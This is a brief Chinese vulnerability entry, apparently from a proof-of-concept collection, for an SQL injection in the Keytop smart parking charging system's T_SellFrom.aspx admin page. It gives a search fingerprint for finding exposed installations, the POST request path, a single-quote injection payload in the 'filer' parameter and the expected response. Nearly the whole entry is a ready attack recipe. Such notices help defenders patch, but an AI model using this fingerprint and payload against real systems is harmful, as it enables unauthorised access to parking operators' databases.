# 科拓全智能停车收费系统T_SellFrom.aspx存在SQL注入漏洞

科拓全智能停车收费系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/Sys/CommonJs/artDialog/skins/simple.css"`
- **请求**：`POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1`

**Payload**
```
start=0&limit=20&filer='
```
- **响应特征**：200